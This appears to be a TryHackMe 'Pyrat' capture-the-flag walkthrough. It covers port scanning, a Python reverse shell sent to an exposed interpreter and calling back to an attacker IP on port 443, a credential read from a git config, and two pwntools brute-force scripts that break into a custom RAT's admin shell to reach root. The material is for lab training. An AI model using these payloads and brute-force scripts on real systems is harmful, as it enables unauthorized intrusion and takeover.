---
title: "TryHackMe: Pyrat"
author: NeoVirex
categories: [TryHackMe]
tags: [TryHackMe, Pyrat, CTF, Cybersecurity, Ethical Hacking, Reverse Shell, Privilege Escalation, Python Exploitation, Git Credential Leak, Linux Enumeration, InfoSec, RAT Exploit, Penetration Testing, Beginner CTF, Capture The Flag, THM Walkthrough, Offensive Security, Cybersecurity Training]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_pyrat/
image:
  path: room-img.png
description: "Pyrat room is a beginner-friendly Capture The Flag (CTF) challenge focused on exploiting a vulnerable Python-based web application. The machine hosts a Python interpreter over a raw TCP connection, allowing arbitrary code execution. The challenge involves gaining a reverse shell, enumerating hidden credentials in a Git repository, escalating privileges from a web user to the main user, and finally gaining root access by analyzing an insecure custom RAT (Remote Access Tool). This room teaches skills in enumeration, reverse shell creation, Git credential leaks, and basic privilege escalation."
---
# Pyrat

Created: June 1, 2025 12:54 PM
Status: Not started

## Initial Enumeration

The first step involves scanning the target machine to identify open ports and services. Using

Rustscan

```jsx
└─$ rustscan -a 10.10.203.228 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Breaking and entering... into the world of open ports.

[~] The config file is expected to be at "/home/neo/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.203.228:22
Open 10.10.203.228:8000
[~] Starting Script(s)                                                
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A" on ip 10.10.203.228                                                                    
Depending on the complexity of the script, results may take some time to appear.                                                            
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 13:08 EDT   
...
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:10:af:a7:17:bd:07:5f:04:dc:e6:b9:4e:e2:0a:0c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBkZkj5UEekI0G4fMawMd2lFyNcVSY8ZwE+dMzRHUd1ywwQ4zGJIW06AJV+XLBvigPR+IVlbcRF+oEeydefWNDd6DbBiKLCwy50ou747jpanTeUdxExh5h8hPM3L63K/xQMGu0xAkrYpntBh7i7Ww0SNYoG/cIRwmMA42iP0on0mVLQw4VpnakC0WIISi//GTV8ZuJ1cFPIetYm5oyk4MdYRUrzdksh/1nYGFv13gNaqrDkP8o1HEZuGfosme+kYmmeojLoCJ0jBHHwqiSIK/V+Lwnni5opEVV8FW+1ox+wu8y8rd/SYP9q5OGJTcV6OiW5j1ud7544+tv8a2GPz1nar6jDO1BaQPV8i1f8Qath2YCxylpBBwCu2Z/IwFPjQrHupFWzu40WoE5cBjd95luwuZ4hWWgP+cjHal9NbBraIxhExYb03a6wCj76WOrxZcq9/aFICL5EwJ70zbwicH/7ifg5veAjWRWDq7tZ2f5DUVOM+LAvi8uhYbDuqXgbTs=
|   256 cc:d9:59:88:4b:49:bd:3f:db:36:4b:30:8c:63:ac:d3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBhqEQreSwVJw+/IJ0ROZUhzXzuL7YnBwbbJ7diJy+9zOt+k79opZ+Lq8X3nWhVN9/5ejqCn/36HYd9wmYHGtDg=
|   256 10:6e:5a:bf:ee:51:b1:51:9e:2d:6b:18:05:be:1b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICscyj2twub6iThOgqAEJqoISIk8M6cxJ42HX4tDhP5k
8000/tcp open  http-alt syn-ack ttl 63 SimpleHTTP/0.6 Python/3.11.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop: 
|     source code string cannot contain null bytes
|   FourOhFourRequest, LPDString, SIPOptions: 
|     invalid syntax (<string>, line 1)
|   GetRequest: 
|     name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     name 'OPTIONS' is not defined
|   Help: 
|_    name 'HELP' is not defined
...
Uptime guess: 25.555 days (since Tue May  6 23:52:13 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   135.35 ms 10.9.0.1
2   136.60 ms 10.10.203.228

NSE: Script Post-scanning.
..
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 186.17 seconds
           Raw packets sent: 55 (3.784KB) | Rcvd: 33 (2.664KB)

```

This reveals two open ports:[YouTube+7DEV Community+7GitHub+7](https://dev.to/zalanihir/tryhackme-pyrat-walkthrough-418p?utm_source=chatgpt.com)

- **22/tcp** – SSH (OpenSSH 8.2p1)
- **8000/tcp** – HTTP (Python's SimpleHTTP/0.6)

### Gaining Initial Access

Accessing the web server on port 8000 returns the message:

![Screenshot From 2025-06-01 13-20-47.png](img1.png)

Connecting via Netcat (nc) to port 8000 and inputting Python commands yields responses, indicating a Python interpreter is exposed:

```jsx
└─$ nc 10.10.203.228 8000  
print("hi")
hi
```

This confirms the ability to execute arbitrary Python code 

## Establishing a Reverse Shell

To gain a more stable shell, a Python reverse shell payload is crafted and sent through the Netcat connection:

```jsx
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("YOUR_IP",443));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty;
pty.spawn("sh")
```

```jsx
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.2.129",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

set up a listener:

```jsx
┌──(neo㉿neo)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.9.2.129] from (UNKNOWN) [10.10.203.228] 34748
```

upgrade shell 

```jsx
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
www-data@ip-10-10-203-228:~$ 
```

Once the payload is executed, a shell as the `www-data` user is obtained

```jsx

www-data@ip-10-10-203-228:~$ pwd
pwd
/root
www-data@ip-10-10-203-228:~$ cd ..
cd ..
www-data@ip-10-10-203-228:/$ cd home
cd home
www-data@ip-10-10-203-228:/home$ ls
ls
think  ubuntu
www-data@ip-10-10-203-228:/home$ cd think
cd think
bash: cd: think: Permission denied
www-data@ip-10-10-203-228:/home$ ls
ls
think  ubuntu
www-data@ip-10-10-203-228:/home$ cd ubuntu
cd ubuntu
www-data@ip-10-10-203-228:/home/ubuntu$ ls
ls
www-data@ip-10-10-203-228:/home/ubuntu$ 

```

## Escalating to User 'think'

### Exploring the filesystem reveals a Git repository at `/opt/dev`

```jsx
$ ls -la /opt
ls -la /opt
total 12
drwxr-xr-x  3 root  root  4096 Jun 21  2023 .
drwxr-xr-x 18 root  root  4096 Jun  1 16:54 ..
drwxrwxr-x  3 think think 4096 Jun 21  2023 dev
$ ls -la /opt/dev/
ls -la /opt/dev/
total 12
drwxrwxr-x 3 think think 4096 Jun 21  2023 .
drwxr-xr-x 3 root  root  4096 Jun 21  2023 ..
drwxrwxr-x 8 think think 4096 Jun 21  2023 .git
$ ls -la /opt/dev/.git
ls -la /opt/dev/.git
total 52
drwxrwxr-x 8 think think 4096 Jun 21  2023 .
drwxrwxr-x 3 think think 4096 Jun 21  2023 ..
drwxrwxr-x 2 think think 4096 Jun 21  2023 branches
-rw-rw-r-- 1 think think   21 Jun 21  2023 COMMIT_EDITMSG
-rw-rw-r-- 1 think think  296 Jun 21  2023 config
-rw-rw-r-- 1 think think   73 Jun 21  2023 description
-rw-rw-r-- 1 think think   23 Jun 21  2023 HEAD
drwxrwxr-x 2 think think 4096 Jun 21  2023 hooks
-rw-rw-r-- 1 think think  145 Jun 21  2023 index
drwxrwxr-x 2 think think 4096 Jun 21  2023 info
drwxrwxr-x 3 think think 4096 Jun 21  2023 logs
drwxrwxr-x 7 think think 4096 Jun 21  2023 objects
drwxrwxr-x 4 think think 4096 Jun 21  2023 refs
```

### Checking the config file

```jsx
$ cat /opt/dev/.git/config
cat /opt/dev/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = _TH1NKINGPirate$_

```

After entering the discovered password, access as `think` is granted

```jsx

www-data@ip-10-10-203-228:/home/ubuntu$ su think
su think
Password: _TH1N[REDACTED]GPirate$_
```

### User flag

```jsx
think@ip-10-10-203-228:~$ ls
ls
snap  user.txt
think@ip-10-10-203-228:~$ cat user.txt
cat user.txt
996bdb1f619[REDACTED]abca5454705
think@ip-10-10-203-228:~$ 
```

## Privilege Escalation to Root

Reading the user's mail:

```jsx
cat /var/mail/think
```

The email mentions a Remote Access Tool (RAT) running on the machine

```jsx
think@ip:~$ cat /var/mail/think
From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
```

running processes, `/root/pyrat.py` 

Investigating further, an older version of the RAT's source code is found in the Git repository.

This script is based on the original blog post by [Jaxafed](https://jaxafed.github.io/posts/tryhackme-pyrat/). great man

```jsx
#!/usr/bin/env python3

from pwn import remote, context
import threading

target_ip = "10.10.98.190"
target_port = 8000
wordlist = "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
stop_flag = threading.Event()
num_threads = 100

def brute_force_input(words):
    context.log_level = "error"
    r = remote(target_ip, target_port)
    for word in words:
        if stop_flag.is_set():
            r.close()
            return
        if word == "shell":
            continue
        r.sendline(word.encode())
        output = r.recvline()
        if b'not defined' not in output and b'<string>' not in output and output != b'\n':
                stop_flag.set()
                print(f"[+] Input found: {word}")
                print(f"[+] Output recieved: {output}")
                r.close()
                return
    r.close()
    return

def main():
    words = [line.strip() for line in open(wordlist, "r").readlines()]
    words_length = len(words)
    step = (words_length + num_threads - 1) // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = min(start + step, words_length)
        if start < words_length:
            thread = threading.Thread(target=brute_force_input, args=(words[start:end],))
            threads.append(thread)
            thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main().
```

Running the script

```jsx
┌──(myenv)─(neo㉿neo)-[~/pro/py]
└─$ python3 p.py             
[+] Input found: admin
[+] Output recieved: b'Start a fresh client to begin.\n'

```

we get admin 

### Using this information, access to the RAT as an admin is achieved, allowing execution of system commands.

The script for the password it is modified 

Analyzing the code reveals a hard coded password or a method to brute-force it.

```jsx
#!/usr/bin/env python3

from pwn import remote, context
import threading

target_ip = "10.10.98.190"
target_port = 8000
wordlist = "/usr/share/seclists/Passwords/500-worst-passwords.txt"
stop_flag = threading.Event()
num_threads = 100

def brute_force_pass(passwords):
    context.log_level = "error"
    r = remote(target_ip, target_port)
    for i in range(len(passwords)):
        if stop_flag.is_set():
            r.close()
            return
        if i % 3 == 0:
            r.sendline(b"admin")
            r.recvuntil(b"Password:\n")
        r.sendline(passwords[i].encode())
        try:
            if b"shell" in r.recvline(timeout=0.5):
                stop_flag.set()
                print(f"[+] Password found: {passwords[i]}")
                r.close()
                return
        except:
            pass
    r.close()
    return

def main():
    passwords = [line.strip() for line in open(wordlist, "r").readlines()]
    passwords_length = len(passwords)
    step = (passwords_length + num_threads - 1) // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = min(start + step, passwords_length)
        if start < passwords_length:
            thread = threading.Thread(target=brute_force_pass, args=(passwords[start:end],))
            threads.append(thread)
            thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
```

Pass-word

```jsx
──(myenv)─(neo㉿neo)-[~/pro/py]
└─$ python3 p1.py  
[+] Password found: abc123
                              
```

### Root flag

```jsx
┌──(myenv)─(neo㉿neo)-[~/pro/py]
└─$ nc 10.10.203.228 8000 

admin
Password:
abc123
Welcome Admin!!! Type "shell" to begin
shell
# ls
ls
pyrat.py  root.txt  snap
# cat root.txt
cat root.txt
ba5ed03e9e[REDACTED]438480165e221
# 

```
<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
